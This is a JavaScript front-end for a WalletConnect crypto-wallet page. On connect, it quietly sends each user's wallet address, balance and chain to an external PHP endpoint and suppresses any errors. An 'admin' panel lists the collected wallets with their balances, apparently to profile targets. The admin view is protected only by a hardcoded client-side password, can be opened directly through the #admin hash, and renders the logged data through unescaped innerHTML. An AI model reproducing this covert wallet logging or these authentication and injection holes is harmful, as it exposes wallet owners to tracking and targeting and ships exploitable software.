import { ethers } from "ethers";
import EthereumProvider from "@walletconnect/ethereum-provider";

const API_BASE = "https://blanchedalmond-moose-670904.hostingersite.com/api";
const ADMIN_PASSWORD = "ChangeMe123";
let provider, ethersProvider;

const connectBtn = document.getElementById("connectBtn");
const disconnectBtn = document.getElementById("disconnectBtn");
const walletApp = document.getElementById("walletApp");
const loading = document.getElementById("loading");
const walletDetails = document.getElementById("walletDetails");
const walletAddress = document.getElementById("walletAddress");
const walletBalance = document.getElementById("walletBalance");
const adminBtn = document.getElementById("adminBtn");
const adminLogin = document.getElementById("adminLogin");
const adminPass = document.getElementById("adminPass");
const loginBtn = document.getElementById("loginBtn");
const adminPanel = document.getElementById("adminPanel");
const sessionList = document.getElementById("sessionList");

async function connectWallet() {
  loading.style.display = "block";
  connectBtn.disabled = true;
  provider = await EthereumProvider.init({ projectId: "84e8498a4e08cafe1acaf08369fd7a56", chains: [1,56,137], showQrModal: true });
  await provider.enable();
  ethersProvider = new ethers.BrowserProvider(provider);
  const signer = await ethersProvider.getSigner();
  const address = await signer.getAddress();
  const balance = await ethersProvider.getBalance(address);
  walletAddress.textContent = address;
  walletBalance.textContent = ethers.formatEther(balance);
  walletDetails.style.display = "block";
  loading.style.display = "none";
  localStorage.setItem("wallet_connected", "1");
  try {
    const res = await fetch(`${API_BASE}/log.php`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ address, balance: ethers.formatEther(balance), chainId: provider.chainId, timestamp: Date.now() })
    });
    await res.json();
  } catch(e){}
}

function disconnectWallet() {
  if (provider) provider.disconnect();
  localStorage.removeItem("wallet_connected");
  walletDetails.style.display = "none";
  connectBtn.disabled = false;
}

async function loadSessions() {
  sessionList.innerHTML = "";
  try {
    const res = await fetch(`${API_BASE}/logs.json`);
    const logs = await res.json();
    logs.filter(e=>e&&e.address).forEach((e,i)=>{
      const li = document.createElement("li");
      li.className = "list-group-item";
      li.innerHTML = `<strong>#${i+1}</strong> - ${new Date(e.timestamp).toLocaleString()}<br/>
        <strong>Address:</strong> ${e.address}<br/>
        <strong>Balance:</strong> ${e.balance} ETH<br/>
        <strong>Chain:</strong> ${e.chainId}<br/>`;
      sessionList.appendChild(li);
    });
  } catch(e){}
}

function handleRoute() {
  const h = location.hash;
  walletApp.style.display = "none";
  adminLogin.style.display = "none";
  adminPanel.style.display = "none";
  if (h === "#admin") { adminPanel.style.display = "block"; loadSessions(); }
  else if (h === "#login") adminLogin.style.display = "block";
  else walletApp.style.display = "block";
}

connectBtn.addEventListener("click", connectWallet);
disconnectBtn.addEventListener("click", disconnectWallet);
adminBtn.addEventListener("click", ()=>location.hash="#login");
loginBtn.addEventListener("click", ()=>{ if(adminPass.value===ADMIN_PASSWORD) location.hash="#admin"; else alert("Wrong password");});
if(localStorage.getItem("wallet_connected")==="1") connectWallet();
window.addEventListener("hashchange", handleRoute);
window.addEventListener("load", handleRoute);
